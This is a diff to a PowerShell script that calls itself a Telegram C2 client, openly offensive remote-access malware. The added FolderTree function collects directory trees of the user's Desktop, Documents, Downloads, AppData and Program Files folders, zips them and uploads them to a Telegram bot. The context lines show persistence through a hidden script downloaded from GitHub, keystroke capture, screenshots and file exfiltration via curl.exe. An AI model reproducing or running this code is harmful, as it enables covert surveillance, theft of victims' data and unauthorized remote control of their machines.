@@ -20,6 +20,7 @@ $glass = [char]::ConvertFromUtf32(0x1F50D)
 $cmde = [char]::ConvertFromUtf32(0x1F517)
 Write-Output "Starting Telegram C2 Client"
 Sleep 10
+
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){
 rm -path "$env:TEMP\temp.ps1" -Force
 rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force
@@ -51,6 +52,7 @@ $contents = "==============================================
 ==============================================
 Close   : Close this Session
 PauseSession   : Kills this session and restarts
+FolderTree    : Gets Dir tree and sends it zipped
 Persistance   : Add Telegram C2 to Startup
 Screenshot   : Sends a screenshot of the desktop
 Keycapture    : Capture Keystrokes and send
@@ -85,7 +87,7 @@ Function Close{
 $contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
-rm -Path "$env:temp/tgps.txt" -Force
+rm -Path "$env:temp/tgc2.txt" -Force
 exit
 }
 
@@ -145,7 +147,7 @@ foreach ($folder in $foldersToSearch) {
     }
 $zipArchive.Dispose()
 curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"
-Remove-Item -Path $zipFilePath -Force
+rm -Path $zipFilePath -Force
 Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
 }
 
@@ -234,7 +236,7 @@ if ($newScriptPath.Length -lt 100){
     "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
     i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
     sleep 1
-    Get-Content -Path "$env:TEMP/temp.ps1" | Out-File $newScriptPath -Append
+    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
     }
 $attributes = [System.IO.FileAttributes]::Hidden
 Set-ItemProperty -Path $newScriptPath -Name Attributes -Value $attributes
@@ -418,6 +420,17 @@ Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 
 Function FolderTree{
 
+tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
+tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
+tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
+tree $env:APPDATA /A /F | Out-File $env:temp/Appdata.txt
+tree $env:PROGRAMFILES /A /F | Out-File $env:temp/ProgramFiles.txt
+
+$zipFilePath ="$env:temp/TreesOfKnowledge.zip"
+Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt, $env:TEMP\Appdata.txt, $env:TEMP\ProgramFiles.txt -DestinationPath $zipFilePath
+sleep 1
+curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"
+rm -Path $zipFilePath -Force
 
 Write-Output "Done."
 }
@@ -429,7 +442,7 @@ if ($newScriptPath.Length -lt 100){
     "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
     "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
     i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
-    Get-Content -Path "$env:TEMP/temp.ps1" | Out-File $newScriptPath -Append
+    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
     }
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
@@ -459,8 +472,8 @@ param($CheckMessage)
 Function StrmFX{
 param($Stream)
 $FixedResult=@()
-$Stream | Out-File -FilePath (Join-Path $env:temp -ChildPath "tgps.txt") -Force
-$ReadAsArray= Get-Content -Path (Join-Path $env:temp -ChildPath "tgps.txt") | where {$_.length -gt 0}
+$Stream | Out-File -FilePath (Join-Path $env:temp -ChildPath "tgc2.txt") -Force
+$ReadAsArray= Get-Content -Path (Join-Path $env:temp -ChildPath "tgc2.txt") | where {$_.length -gt 0}
 foreach ($line in $ReadAsArray){
     $ArrObj=New-Object psobject
     $ArrObj | Add-Member -MemberType NoteProperty -Name "Line" -Value ($line).tostring()
@@ -503,4 +516,3 @@ $messages=rtgmsg
         }
     }
 }
-
